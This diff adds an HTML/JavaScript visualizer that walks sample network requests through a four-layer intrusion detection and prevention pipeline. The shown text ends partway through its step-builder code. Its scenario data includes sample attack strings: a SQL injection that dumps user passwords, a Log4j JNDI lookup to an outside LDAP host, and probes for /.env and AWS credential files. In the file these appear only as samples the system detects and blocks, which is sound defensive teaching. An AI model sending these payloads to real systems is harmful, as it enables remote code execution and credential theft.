@@ -1,0 +1,1100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Active IPS Firewall - Defense-in-Depth Visualizer</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#f6f8fc; --card:#fff; --ink:#0f172a; --ink2:#334155; --muted:#64748b; --line:#e0e6f1;
+  --blue:#2563eb; --blue-soft:#e8f0ff;
+  --green:#16a34a; --green-soft:#e7f6ec;
+  --red:#dc2626; --red-soft:#fdecec;
+  --amber:#d97706; --amber-soft:#fff3e0;
+  --violet:#7c3aed; --violet-soft:#f1ebff;
+  --fuchsia:#a21caf; --fuchsia-soft:#fae8ff;
+  --cyan:#0284c7; --cyan-soft:#e0f2fe;
+  --shadow:0 8px 24px rgba(15,23,42,.07);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--ink);display:flex;flex-direction:column;overflow:hidden}
+svg.i{width:1em;height:1em;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;flex:none}
+.deck{flex:1;position:relative;min-height:0}
+.slide{position:absolute;inset:0;padding:22px 36px 10px;display:flex;flex-direction:column;opacity:0;pointer-events:none;transform:translateX(36px);transition:opacity .4s ease,transform .4s ease}
+.slide.active{opacity:1;pointer-events:auto;transform:none}
+.slide.past{transform:translateX(-36px)}
+
+/* nav */
+.nav{height:52px;display:flex;align-items:center;justify-content:space-between;padding:0 28px;border-top:1px solid var(--line);background:#fff}
+.btn{font:600 13.5px Inter,sans-serif;border:1px solid var(--line);background:#fff;color:var(--ink);padding:9px 16px;border-radius:10px;cursor:pointer;transition:.15s;display:inline-flex;align-items:center;gap:8px}
+.btn svg{font-size:16px}
+.btn:hover:not(:disabled){border-color:#b9c6e0;background:#f8faff}
+.btn.primary{background:var(--blue);border-color:var(--blue);color:#fff}
+.btn.primary:hover:not(:disabled){background:#1d4fd0;border-color:#1d4fd0}
+.btn:disabled{opacity:.35;cursor:not-allowed}
+.navr{display:flex;gap:10px}
+.dots{display:flex;gap:7px;align-items:center}
+.dot{width:8px;height:8px;border-radius:99px;background:#d3dbe9;transition:.3s}
+.dot.on{width:26px;background:var(--blue)} .dot.done{background:#9bb8f3}
+
+/* title */
+.hero{margin:auto;text-align:center;max-width:920px}
+.eyebrow{display:inline-block;font:700 11.5px Inter;letter-spacing:.14em;text-transform:uppercase;color:var(--blue);background:var(--blue-soft);padding:6px 14px;border-radius:99px}
+.hero h1{font-size:clamp(32px,4.5vw,54px);line-height:1.08;letter-spacing:-.03em;margin:20px 0 14px;font-weight:800}
+.hero h1 span{color:var(--blue)}
+.hero p{color:var(--muted);font-size:clamp(14.5px,1.4vw,17.5px);max-width:700px;margin:0 auto;line-height:1.55}
+.mini{display:flex;justify-content:center;align-items:center;gap:8px;margin-top:32px;flex-wrap:wrap}
+.mini .m{display:flex;align-items:center;gap:7px;background:#fff;border:1px solid var(--line);border-radius:12px;padding:10px 13px;font-weight:600;font-size:12.5px}
+.mini .m svg{font-size:16px;color:var(--blue)}
+.mini .ar{color:#a6b3cb;font-size:16px;display:flex}
+
+/* choose */
+.h2{font-size:clamp(22px,2.6vw,32px);font-weight:800;letter-spacing:-.02em}
+.sub{color:var(--muted);margin-top:4px;font-size:14.5px}
+code,.mono{font-family:'JetBrains Mono',monospace}
+.sub code{font-size:13px;background:#eaeff8;padding:2px 6px;border-radius:6px;color:var(--ink2)}
+.choose{flex:1;display:flex;flex-direction:column;justify-content:center;gap:16px;max-width:1040px;margin:0 auto;width:100%}
+.cards{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.pick{background:var(--card);border:2px solid var(--line);border-radius:18px;padding:20px;cursor:pointer;transition:.18s;text-align:left;font-family:inherit;color:inherit}
+.pick:hover{border-color:#b9c6e0;transform:translateY(-2px);box-shadow:var(--shadow)}
+.pick .ic{width:46px;height:46px;border-radius:12px;display:grid;place-items:center;font-size:22px;margin-bottom:12px}
+.pick h3{font-size:19px;margin-bottom:4px}
+.pick p{color:var(--muted);font-size:13.5px;line-height:1.45}
+.pick.safe .ic{background:var(--green-soft);color:var(--green)} .pick.atk .ic{background:var(--red-soft);color:var(--red)}
+.pick.sel.safe{border-color:var(--green);background:var(--green-soft)}
+.pick.sel.atk{border-color:var(--red);background:var(--red-soft)}
+
+.atkrow{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;transition:.3s;overflow:hidden}
+.atkrow.hide{opacity:0;max-height:0;pointer-events:none}
+.atkrow:not(.hide){max-height:280px}
+.chip-btn{background:#fff;border:1.5px solid var(--line);border-radius:12px;padding:11px 13px;cursor:pointer;text-align:left;font-family:inherit;color:inherit;transition:.15s}
+.chip-btn .tag{display:inline-block;font-size:10px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;padding:2px 6px;border-radius:4px;margin-bottom:4px}
+.chip-btn b{display:block;font-size:13.5px}
+.chip-btn span{display:block;font-size:11px;color:var(--muted);margin-top:2px;font-family:'JetBrains Mono',monospace}
+.chip-btn:hover{border-color:#f0a8a8}
+.chip-btn.sel{border-color:var(--red);background:var(--red-soft)}
+.chip-btn .tag.l0{background:var(--fuchsia-soft);color:var(--fuchsia)}
+.chip-btn .tag.l1{background:var(--blue-soft);color:var(--blue)}
+.chip-btn .tag.l2{background:var(--violet-soft);color:var(--violet)}
+.chip-btn .tag.l3{background:var(--cyan-soft);color:var(--cyan)}
+
+.modebar{display:flex;align-items:center;justify-content:space-between;gap:16px;background:#fff;border:1px solid var(--line);border-radius:14px;padding:12px 18px}
+.modebar b{font-size:14px} .modebar span.d{display:block;color:var(--muted);font-size:12.5px;margin-top:2px}
+
+/* toggle */
+.tog{display:inline-flex;align-items:center;gap:9px;cursor:pointer;user-select:none;font:700 12px Inter;border:1px solid var(--line);background:#fff;padding:5px 6px 5px 12px;border-radius:99px;transition:.15s}
+.tog:hover{border-color:#b9c6e0}
+.tog .sw{width:36px;height:20px;border-radius:99px;background:#cbd5e5;position:relative;transition:.25s}
+.tog .sw::after{content:"";position:absolute;top:2px;left:2px;width:16px;height:16px;border-radius:50%;background:#fff;box-shadow:0 1px 3px rgba(0,0,0,.3);transition:.25s}
+.tog.on .sw{background:var(--green)} .tog.on .sw::after{left:18px}
+.tog .lbl{min-width:98px}
+
+/* sim */
+.simhead{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.simhead .h2{font-size:20px}
+.pill{display:inline-flex;align-items:center;gap:7px;font:700 12px Inter;padding:6px 12px;border-radius:99px}
+.pill svg{font-size:13px}
+.pill.safe{background:var(--green-soft);color:var(--green)} .pill.atk{background:var(--red-soft);color:var(--red)}
+.stagewrap{flex:1;min-height:0;position:relative;margin:8px 0;background:#fff;border:1px solid var(--line);border-radius:18px;overflow:hidden;
+  background-image:radial-gradient(#dfe6f2 1.1px,transparent 1.1px);background-size:22px 22px}
+.canvas{position:absolute;left:0;top:0;width:1200px;height:570px;transform-origin:0 0}
+svg.edges{position:absolute;inset:0;width:1200px;height:570px;overflow:visible}
+.edge{fill:none;stroke:#c3cde0;stroke-width:2.5;stroke-dasharray:7 7;transition:stroke .4s;marker-end:url(#mg)}
+.edge.on{stroke-dasharray:none;stroke-width:4}
+.edge.on.safe{stroke:var(--green);marker-end:url(#ms)} .edge.on.atk{stroke:var(--red);marker-end:url(#ma)}
+.elabel{position:absolute;font:700 11px Inter;background:#fff;border:1px solid var(--line);color:var(--muted);padding:3px 8px;border-radius:99px;transform:translate(-50%,-50%);white-space:nowrap}
+.node{position:absolute;width:180px;height:78px;margin:-39px 0 0 -90px;background:#fff;border:2px solid var(--line);border-radius:16px;padding:10px 12px;display:flex;align-items:center;gap:10px;box-shadow:0 4px 14px rgba(15,23,42,.06);transition:.35s}
+.node .ni{flex:none;width:38px;height:38px;border-radius:10px;display:grid;place-items:center;font-size:19px;background:#eef2f9;color:var(--ink2);transition:.35s}
+.node.c-blue .ni{background:var(--blue-soft);color:var(--blue)}
+.node.c-violet .ni{background:var(--violet-soft);color:var(--violet)}
+.node.c-amber .ni{background:var(--amber-soft);color:var(--amber)}
+.node.c-green .ni{background:var(--green-soft);color:var(--green)}
+.node.c-red .ni{background:var(--red-soft);color:var(--red)}
+.node.c-fuchsia .ni{background:var(--fuchsia-soft);color:var(--fuchsia)}
+.node.c-cyan .ni{background:var(--cyan-soft);color:var(--cyan)}
+.node b{display:block;font-size:13px;line-height:1.15}
+.node small{display:block;color:var(--muted);font-size:11px;margin-top:3px;line-height:1.25}
+.node.visited{border-color:#a9c0f4}
+.node.cur{border-color:var(--blue);box-shadow:0 0 0 5px rgba(37,99,235,.13),0 8px 22px rgba(15,23,42,.10);transform:scale(1.04)}
+.node.out.blocked.cur,.node.out.blocked.visited{border-color:var(--red);background:var(--red-soft)}
+.node.out.monitor.cur,.node.out.monitor.visited{border-color:var(--amber);background:var(--amber-soft)}
+.node.out.allow.cur,.node.out.allow.visited{border-color:var(--green);background:var(--green-soft)}
+.node.out.blocked.cur{box-shadow:0 0 0 5px rgba(220,38,38,.15),0 8px 22px rgba(15,23,42,.10)}
+.node.out.monitor.cur{box-shadow:0 0 0 5px rgba(217,119,6,.17),0 8px 22px rgba(15,23,42,.10)}
+.node.out.allow.cur{box-shadow:0 0 0 5px rgba(22,163,74,.15),0 8px 22px rgba(15,23,42,.10)}
+
+.packet{position:absolute;left:0;top:0;z-index:5;min-width:130px;height:36px;padding:0 14px;border-radius:10px;color:#fff;font:700 12.5px Inter;display:flex;align-items:center;justify-content:center;gap:7px;white-space:nowrap;transition:transform .95s cubic-bezier(.65,0,.25,1),background .4s;box-shadow:0 10px 22px rgba(15,23,42,.22)}
+.packet svg{font-size:15px}
+.packet.safe{background:linear-gradient(135deg,#22c55e,#15803d)}
+.packet.atk{background:linear-gradient(135deg,#f87171,#b91c1c)}
+.packet.stopped{animation:shake .5s}
+@keyframes shake{0%,100%{margin-left:0}20%{margin-left:-8px}40%{margin-left:8px}60%{margin-left:-5px}80%{margin-left:5px}}
+
+/* caption - compact 3-column bar to maximize visualizer stage height */
+.cap{background:#fff;border:1px solid var(--line);border-radius:12px;padding:7px 16px;display:grid;grid-template-columns:250px 1fr auto;gap:14px;align-items:center;position:relative;overflow:hidden;min-height:46px}
+.cap .prog{position:absolute;left:0;top:0;height:3px;background:var(--blue);transition:width .5s;border-radius:0 3px 3px 0}
+.cap-title-col{display:flex;flex-direction:column;justify-content:center;border-right:1px solid var(--line);padding-right:12px;min-width:0}
+.cap-body-col{display:flex;align-items:center;min-width:0}
+.cap-chips-col{display:flex;align-items:center;justify-content:flex-end;border-left:1px solid var(--line);padding-left:12px}
+.stepno{font:700 10.5px Inter;letter-spacing:.09em;text-transform:uppercase;color:var(--blue);line-height:1}
+.captitle{font-size:13.5px;font-weight:800;margin:2px 0 0;letter-spacing:-.01em;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.capbody{color:var(--ink2);font-size:12px;line-height:1.35}
+.capbody code{font-size:11px;background:#eef2f9;padding:1px 5px;border-radius:4px}
+.chips{display:flex;gap:6px;align-items:center;flex-wrap:nowrap}
+.chip{display:flex;flex-direction:column;background:#f3f6fc;border:1px solid var(--line);border-radius:7px;padding:3px 8px;min-width:68px}
+.chip span{color:var(--muted);font:600 9px Inter;text-transform:uppercase;letter-spacing:.05em;line-height:1}
+.chip code{font:600 11px 'JetBrains Mono',monospace;color:var(--ink);margin-top:1px;white-space:nowrap;line-height:1.1}
+.chip.red code{color:var(--red)} .chip.green code{color:var(--green)} .chip.amber code{color:var(--amber)} .chip.fuchsia code{color:var(--fuchsia)}
+
+/* result */
+.resgrid{flex:1;display:grid;grid-template-columns:1fr 1fr;gap:20px;align-items:center;max-width:1060px;margin:0 auto;width:100%}
+.verdict{border-radius:22px;padding:30px;text-align:center;border:2px solid}
+.verdict .vi{width:56px;height:56px;border-radius:16px;margin:0 auto 12px;display:grid;place-items:center;font-size:28px;background:#fff}
+.verdict.blocked{background:var(--red-soft);border-color:var(--red)} .verdict.allow{background:var(--green-soft);border-color:var(--green)} .verdict.monitor{background:var(--amber-soft);border-color:var(--amber)}
+.verdict .code{font-size:64px;font-weight:800;letter-spacing:-.04em;line-height:1}
+.verdict.blocked .code,.verdict.blocked .vi{color:var(--red)} .verdict.allow .code,.verdict.allow .vi{color:var(--green)} .verdict.monitor .code,.verdict.monitor .vi{color:var(--amber)}
+.verdict .st{font-size:20px;font-weight:800;margin:10px 0 6px}
+.verdict p{color:#475569;font-size:14px;line-height:1.5}
+.cmp{background:#fff;border:1px solid var(--line);border-radius:18px;padding:20px}
+.cmp h4{font-size:14px;margin-bottom:12px;display:flex;align-items:center;justify-content:space-between}
+.row{display:grid;grid-template-columns:1fr auto;gap:10px;align-items:center;padding:12px 14px;border-radius:11px;margin-bottom:9px;border:2px solid transparent;background:#f3f6fc}
+.row.now{border-color:var(--blue);background:var(--blue-soft)}
+.row b{font-size:13.5px;display:block} .row span.d{font-size:12px;color:var(--muted)}
+.badge{font:800 12px Inter;padding:6px 10px;border-radius:8px}
+.badge.red{background:var(--red);color:#fff} .badge.green{background:var(--green);color:#fff} .badge.amber{background:var(--amber);color:#fff}
+.reactions{display:flex;gap:10px;margin-top:8px;flex-wrap:wrap}
+
+.shortcuts-hint{font-size:11px;color:var(--muted);margin-top:14px;text-align:center;letter-spacing:.02em}
+.shortcuts-hint kbd{background:#eaeff8;border:1px solid #cbd5e5;padding:1px 5px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:10.5px;color:var(--ink2)}
+
+@media (max-width:860px){
+  .slide{padding:14px 12px 6px}.cards{grid-template-columns:1fr}.atkrow{grid-template-columns:1fr}
+  .cap{grid-template-columns:1fr;gap:8px}.cap-title-col,.cap-chips-col{border:none;padding:0}.chips{flex-wrap:wrap}.resgrid{grid-template-columns:1fr}.nav{padding:0 12px}.dots{display:none}
+}
+</style>
+</head>
+<body>
+<svg width="0" height="0" style="position:absolute"><defs id="icondefs"></defs></svg>
+<div class="deck" id="deck">
+
+  <!-- SLIDE 0: HERO -->
+  <section class="slide" id="s0">
+    <div class="hero">
+      <span class="eyebrow">Interactive 4-Layer Walkthrough</span>
+      <h1>How the <span>Hybrid IDS/IPS</span> drops attacks</h1>
+      <p>Follow network queries through the 4-layer defense pipeline: <strong>Layer 0 Quarantine</strong>, <strong>Layer 1 Signatures</strong>, <strong>Layer 2 Flow ML</strong>, and <strong>Layer 3 Shannon Entropy &amp; Honeypot Decoys</strong>.</p>
+      <div class="mini" id="miniflow"></div>
+      <div class="shortcuts-hint" style="margin-top:28px">
+        Keyboard Shortcuts: <kbd>Space</kbd> / <kbd>&rarr;</kbd> Next &middot; <kbd>&larr;</kbd> Back &middot; <kbd>P</kbd> Auto-Play &middot; <kbd>B</kbd> Toggle Block Mode &middot; <kbd>F</kbd> Fullscreen &middot; <kbd>1-8</kbd> Quick Select
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 1: CHOOSE -->
+  <section class="slide" id="s1">
+    <div style="max-width:1040px;margin:0 auto;width:100%">
+      <div class="h2">Choose the network query to simulate</div>
+      <div class="sub">Select legitimate business traffic or one of 7 multi-layer attack scenarios from <code>live_demo.py</code>.</div>
+    </div>
+    <div class="choose">
+      <div class="cards">
+        <button class="pick safe" id="pickSafe">
+          <div class="ic" data-ic="check"></div>
+          <h3>1. Benign Traffic</h3>
+          <p>Normal HTTP customer catalog query. Clean payload, ordinary packet rate, verified safe flow.</p>
+        </button>
+        <button class="pick atk" id="pickAtk">
+          <div class="ic" data-ic="zap"></div>
+          <h3>2. Malicious Query (7 Scenarios)</h3>
+          <p>Multi-layer cyber attack targeting Layer 0, Layer 1, Layer 2, or Layer 3 inspection engines.</p>
+        </button>
+      </div>
+
+      <div class="atkrow hide" id="atkrow">
+        <button class="chip-btn" data-a="sqli">
+          <span class="tag l1">Layer 1: Suricata</span>
+          <b>SQL Injection</b>
+          <span>' OR 1=1 UNION SELECT</span>
+        </button>
+        <button class="chip-btn" data-a="log4j">
+          <span class="tag l1">Layer 1: Suricata</span>
+          <b>Log4j JNDI RCE</b>
+          <span>${jndi:ldap://evil/a}</span>
+        </button>
+        <button class="chip-btn" data-a="syn">
+          <span class="tag l2">Layer 2: Flow ML</span>
+          <b>TCP SYN Flood</b>
+          <span>zero-sig / 48k pps ML</span>
+        </button>
+        <button class="chip-btn" data-a="slow">
+          <span class="tag l2">Layer 2: Flow ML</span>
+          <b>Slowloris Starvation</b>
+          <span>low-rate IAT starvation</span>
+        </button>
+        <button class="chip-btn" data-a="shellcode">
+          <span class="tag l3">Layer 3: Entropy DPI</span>
+          <b>XOR Shellcode</b>
+          <span>H(X)=6.11 bits/B obfuscated</span>
+        </button>
+        <button class="chip-btn" data-a="honeypot">
+          <span class="tag l3">Layer 3: Decoy Trap</span>
+          <b>Honeypot Decoy Probe</b>
+          <span>GET /.env &amp; /.aws/credentials</span>
+        </button>
+        <button class="chip-btn" data-a="quarantine">
+          <span class="tag l0">Layer 0: IP Cache</span>
+          <b>Repeat Quarantined IP</b>
+          <span>203.0.113.55 (0.01ms drop)</span>
+        </button>
+      </div>
+
+      <div class="modebar">
+        <div>
+          <b>Active IPS Firewall: Block Mode Switch</b>
+          <span class="d">OFF = Monitor Only (IDS logs threat, does not drop). ON = Active IPS (Drops attack with 403 &amp; bans IP).</span>
+        </div>
+        <div class="tog on" id="togChoose"><span class="lbl">BLOCK MODE: ON</span><span class="sw"></span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 2: SIMULATION STAGE -->
+  <section class="slide" id="s2" style="padding:10px 28px 6px">
+    <div class="simhead">
+      <div class="h2" style="font-size:18px">Follow the request through the 4 defense layers</div>
+      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+        <span class="pill" id="scPill"></span>
+        <button class="btn" id="autoPlayBtn" style="padding:5px 12px;border-radius:99px;font-size:11.5px;">
+          <svg class="i" viewBox="0 0 24 24"><polygon points="6 3 20 12 6 21 6 3"/></svg>
+          <span id="autoPlayLbl">Auto-Play</span>
+        </button>
+        <div class="tog on" id="togSim"><span class="lbl">BLOCK MODE: ON</span><span class="sw"></span></div>
+      </div>
+    </div>
+
+    <div class="stagewrap" id="stagewrap" style="margin:6px 0">
+      <div class="canvas" id="canvas">
+        <svg class="edges" id="edges" viewBox="0 0 1200 570"></svg>
+        <div id="labels"></div>
+        <div id="nodes"></div>
+        <div class="packet safe" id="packet"></div>
+      </div>
+    </div>
+
+    <div class="cap">
+      <div class="prog" id="prog"></div>
+      <div class="cap-title-col">
+        <div class="stepno" id="stepno"></div>
+        <div class="captitle" id="captitle"></div>
+      </div>
+      <div class="cap-body-col">
+        <div class="capbody" id="capbody"></div>
+      </div>
+      <div class="cap-chips-col">
+        <div class="chips" id="chips"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SLIDE 3: RESULT -->
+  <section class="slide" id="s3">
+    <div style="max-width:1060px;margin:0 auto;width:100%">
+      <div class="h2">Firewall Verdict &amp; Threat Mitigation</div>
+      <div class="sub" id="resSub"></div>
+    </div>
+    <div class="resgrid">
+      <div class="verdict" id="verdict"></div>
+      <div class="cmp">
+        <h4>
+          <span>Side-by-side comparison</span>
+          <span id="mitreBadge" style="font-size:11px;font-family:'JetBrains Mono',monospace;color:var(--muted)"></span>
+        </h4>
+        <div id="cmpRows"></div>
+        <div class="reactions">
+          <button class="btn" id="flipBtn"></button>
+          <button class="btn" id="againBtn"></button>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<!-- NAVIGATION BAR -->
+<div class="nav">
+  <button class="btn" id="back"></button>
+  <div class="dots" id="dots"></div>
+  <div class="navr">
+    <button class="btn" id="fs" title="Toggle Fullscreen (F)"></button>
+    <button class="btn primary" id="next"></button>
+  </div>
+</div>
+
+<script>
+/* ---------- ICONS (SVG LINE ICONS) ---------- */
+const IC = {
+  terminal: '<polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>',
+  lock: '<rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',
+  search: '<circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>',
+  tree: '<circle cx="12" cy="5" r="2"/><circle cx="6" cy="19" r="2"/><circle cx="18" cy="19" r="2"/><path d="M12 7v4M12 11l-6 6M12 11l6 6"/>',
+  box: '<path d="M21 16V8a2 2 0 00-1-1.73l-7-4a2 2 0 00-2 0l-7 4A2 2 0 003 8v8a2 2 0 001 1.73l7 4a2 2 0 002 0l7-4A2 2 0 0021 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/>',
+  bars: '<line x1="6" y1="20" x2="6" y2="12"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="18" y1="20" x2="18" y2="9"/>',
+  shield: '<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>',
+  ban: '<circle cx="12" cy="12" r="10"/><line x1="4.9" y1="4.9" x2="19.1" y2="19.1"/>',
+  alert: '<path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>',
+  check: '<path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>',
+  pulse: '<polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>',
+  zap: '<polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>',
+  right: '<line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/>',
+  left: '<line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/>',
+  refresh: '<polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/>',
+  swap: '<polyline points="17 1 21 5 17 9"/><path d="M3 11V9a4 4 0 014-4h14"/><polyline points="7 23 3 19 7 15"/><path d="M21 13v2a4 4 0 01-4 4H3"/>',
+  eye: '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>',
+  expand: '<polyline points="15 3 21 3 21 9"/><polyline points="9 21 3 21 3 15"/><line x1="21" y1="3" x2="14" y2="10"/><line x1="3" y1="21" x2="10" y2="14"/>',
+  play: '<polygon points="6 3 20 12 6 21 6 3"/>',
+  pause: '<rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/>',
+};
+const ic = (n) => `<svg class="i" viewBox="0 0 24 24">${IC[n] || ''}</svg>`;
+function hydrateIcons(root = document){ root.querySelectorAll('[data-ic]').forEach(e => { e.innerHTML = ic(e.dataset.ic); }); }
+
+/* ---------- 8 DATA SCENARIOS (MATCHING live_demo.py) ---------- */
+const SC = {
+  safe: {
+    name: 'Normal Product Search',
+    short: 'Safe HTTP GET',
+    payload: 'GET /api/catalog/products?q=monitor HTTP/1.1',
+    src_ip: '192.168.1.25',
+    kind: 'safe',
+    layer: 4,
+    p: 0.03,
+    entropy: 4.35,
+    feats: 'pps: 32 | IAT: 320ms | SYN: 1',
+    port: 80,
+    mitre: 'Legitimate Traffic'
+  },
+  sqli: {
+    name: 'SQL Injection Credential Dump',
+    short: 'SQLi Attack',
+    payload: "id=1' UNION SELECT username, password FROM users --",
+    src_ip: '203.0.113.55',
+    kind: 'atk',
+    layer: 1,
+    sid: 2010935,
+    rule: 'ET WEB_SERVER SQL Injection UNION SELECT',
+    sev: 90, conf: 100, beh: 60, ctx: 80,
+    score: 87.8,
+    port: 80,
+    mitre: 'T1190 - Exploit Public-Facing Application'
+  },
+  log4j: {
+    name: 'Apache Log4j JNDI RCE',
+    short: 'Log4j RCE',
+    payload: '${jndi:ldap://198.51.100.77:1389/ExploitPayload}',
+    src_ip: '203.0.113.88',
+    kind: 'atk',
+    layer: 1,
+    sid: 2034647,
+    rule: 'ET EXPLOIT Apache Log4j RCE JNDI LDAP',
+    sev: 95, conf: 100, beh: 50, ctx: 90,
+    score: 86.0,
+    port: 8080,
+    mitre: 'T1190 - Exploit Public-Facing Application'
+  },
+  syn: {
+    name: 'Zero-Day TCP SYN Flood',
+    short: 'SYN Flood',
+    payload: '42-packet flood (220us IAT, zero L7 signature)',
+    src_ip: '172.16.99.41',
+    kind: 'atk',
+    layer: 2,
+    p: 0.978,
+    feats: 'pps: 48,200 | SYN/PSH: 0.88 | IAT: 220us',
+    sev: 85, conf: 98, beh: 95, ctx: 70,
+    score: 91.0,
+    port: 443,
+    mitre: 'T1498.001 - Network DoS: Direct Flood'
+  },
+  slow: {
+    name: 'Slowloris Connection Starvation',
+    short: 'Slowloris DoS',
+    payload: '28-stream low-rate TCP starvation (120s keep-alive)',
+    src_ip: '172.16.88.19',
+    kind: 'atk',
+    layer: 2,
+    p: 0.964,
+    feats: 'conns: 400 | IAT std: 42.1s | pps: 8',
+    sev: 85, conf: 96, beh: 100, ctx: 75,
+    score: 92.0,
+    port: 80,
+    mitre: 'T1498.002 - Network DoS: Connection Exhaustion'
+  },
+  shellcode: {
+    name: 'Obfuscated XOR Shellcode Payload',
+    short: 'XOR Shellcode',
+    payload: 'POST /telemetry payload=q8f3Z9mK2xP7vL4nJ1wR8tY5u... (XOR)',
+    src_ip: '198.51.100.212',
+    kind: 'atk',
+    layer: 3,
+    entropy: 6.11,
+    rule: 'Shannon Entropy H(X) = 6.11 bits/B (> 4.85 threshold)',
+    sev: 95, conf: 100, beh: 100, ctx: 85,
+    score: 98.0,
+    port: 8080,
+    mitre: 'T1027 - Obfuscated/Compressed Files'
+  },
+  honeypot: {
+    name: 'Zero-Trust Honeypot Decoy Probe',
+    short: 'Honeypot Decoy',
+    payload: 'GET /.env & /.aws/credentials HTTP/1.1',
+    src_ip: '198.51.100.99',
+    kind: 'atk',
+    layer: 3,
+    rule: 'Zero-Trust Honeypot Trap Triggered (/.env)',
+    sev: 100, conf: 100, beh: 100, ctx: 100,
+    score: 100.0,
+    port: 80,
+    mitre: 'T1083 - File & Directory Discovery'
+  },
+  quarantine: {
+    name: 'Repeat Request from Quarantined IP',
+    short: 'Quarantined IP',
+    payload: 'GET /api/catalog HTTP/1.1 (Repeat IP 203.0.113.55)',
+    src_ip: '203.0.113.55',
+    kind: 'atk',
+    layer: 0,
+    rule: 'Layer 0 Memory Cache: 0.01ms Fast Pre-Filter Drop',
+    sev: 85, conf: 100, beh: 80, ctx: 70,
+    score: 85.0,
+    port: 80,
+    mitre: 'T1595 - Active Scanning (Repeat Offender)'
+  }
+};
+
+/* ---------- NODE CANVAS ARCHITECTURE (1200 x 570) ---------- */
+const NODES = {
+  term:    { x: 80,   y: 300, i: 'terminal', c: 'slate',   t: 'Traffic Ingress',        s: 'live_demo.py client' },
+  l0:      { x: 265,  y: 300, i: 'lock',     c: 'fuchsia', t: 'Layer 0 Quarantine',     s: '0.01ms IP Pre-Filter' },
+  l1:      { x: 455,  y: 300, i: 'search',   c: 'blue',    t: 'Layer 1 Suricata',       s: 'Deterministic SIDs' },
+  l2:      { x: 655,  y: 350, i: 'tree',     c: 'violet',  t: 'Layer 2 Random Forest',  s: '19 Features (τ*=0.64)' },
+  l3:      { x: 655,  y: 485, i: 'box',      c: 'cyan',    t: 'Layer 3 DPI & Decoys',   s: 'Entropy H(X) & Honeypot' },
+  risk:    { x: 655,  y: 135, i: 'bars',     c: 'amber',   t: '4-Factor Risk Scorer',   s: '0.40Sev 0.30Conf 0.20Beh 0.10Ctx' },
+  gate:    { x: 875,  y: 135, i: 'shield',   c: 'blue',    t: 'Active IPS Firewall',    s: 'Enforce Block Mode' },
+  benign:  { x: 875,  y: 485, i: 'pulse',    c: 'green',   t: 'Benign Verified',        s: 'Clean Network Flow' },
+  blocked: { x: 1095, y: 65,  i: 'ban',      c: 'red',     t: '403 BLOCKED',            s: 'Dropped before server', out: 'blocked' },
+  monitor: { x: 1095, y: 205, i: 'eye',      c: 'amber',   t: '200 ALLOWED (Block OFF)',s: 'IDS Logged, Not Dropped', out: 'monitor' },
+  safe:    { x: 1095, y: 485, i: 'check',    c: 'green',   t: '200 ALLOWED (Safe)',     s: 'Normal Business Traffic', out: 'allow' },
+};
+
+const EDGES = [
+  ['term', 'l0', ''],
+  ['l0', 'l1', 'clean IP'],
+  ['l0', 'blocked', '0.01ms drop'],
+  ['l1', 'risk', 'SID match'],
+  ['l1', 'l2', 'no signature'],
+  ['l2', 'risk', 'ML prob >= 0.64'],
+  ['l2', 'l3', 'normal stats'],
+  ['l3', 'risk', 'entropy / decoy hit'],
+  ['l3', 'benign', 'clean payload'],
+  ['benign', 'safe', 'verified safe'],
+  ['risk', 'gate', 'threat score'],
+  ['gate', 'blocked', 'BLOCK: ON'],
+  ['gate', 'monitor', 'BLOCK: OFF']
+];
+
+const W = 180, H = 78;
+const S = { slide: 0, step: 0, sel: null, atk: 'sqli', block: true };
+const $ = (id) => document.getElementById(id);
+const key = () => (S.sel === 'safe' ? 'safe' : S.atk);
+
+let autoPlayTimer = null;
+
+/* ---------- STEP BUILDER (MATCHING 4-TIER PIPELINE) ---------- */
+function buildSteps() {
+  const c = SC[key()], B = S.block, st = [], atk = c.kind === 'atk';
+
+  // Step 1: Ingress
+  st.push({
+    n: 'term',
